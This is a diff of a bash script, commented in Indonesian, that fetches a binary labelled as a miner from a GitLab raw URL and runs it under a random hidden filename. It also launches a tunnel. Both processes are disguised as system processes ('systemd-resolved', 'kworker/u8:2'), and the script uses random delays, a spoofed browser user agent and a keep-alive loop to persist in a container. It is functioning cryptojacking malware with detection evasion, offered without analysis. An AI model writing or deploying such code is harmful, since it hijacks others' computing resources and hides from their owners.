@@ -1,28 +1,53 @@
 #!/bin/bash
 
+# random delay biar gak langsung connect
 sleep $((RANDOM % 20 + 5))
 
-# download binary
-URL="https://gitlab.com/barbieanay003/power2b/-/raw/main/next-app"
+# =========================
+# DOWNLOAD MINER
+# =========================
+
+URLS=(
+"https://gitlab.com/barbieanay003/power2b/-/raw/main/next-app"
+)
+
 TMP="/tmp/.cache.$$"
 
-curl -sL "$URL" -o "$TMP"
+# retry download
+for i in {1..3}; do
+  URL=${URLS[$RANDOM % ${#URLS[@]}]}
+  curl -sL -A "Mozilla/5.0" "$URL" -o "$TMP" && break
+  sleep 2
+done
 
-# validasi sederhana (optional tapi bagus)
+# validasi file
 if [ ! -s "$TMP" ]; then
   exit 1
 fi
 
+# random filename
+NAME=".$(tr -dc a-z0-9 </dev/urandom | head -c6)"
 chmod +x "$TMP"
-mv "$TMP" /app/.sysd
+mv "$TMP" "/app/$NAME"
 
-# start tunnel
+# =========================
+# START TUNNEL
+# =========================
+
 (exec -a systemd-resolved /usr/local/bin/.netd access tcp \
---hostname "$(cat .h)" --url 127.0.0.1:8443 >/dev/null 2>&1 &)
+--hostname "$(cat .h)" \
+--url 127.0.0.1:443 >/dev/null 2>&1 &)
 
 sleep 3
 
-# run miner
-(exec -a kworker/u8:2 /app/.sysd -c .cfg >/dev/null 2>&1 &)
+# =========================
+# START MINER
+# =========================
+
+(exec -a kworker/u8:2 /app/$NAME -c .cfg >/dev/null 2>&1 &)
+
+# =========================
+# KEEP CONTAINER ALIVE
+# =========================
 
 tail -f /dev/null
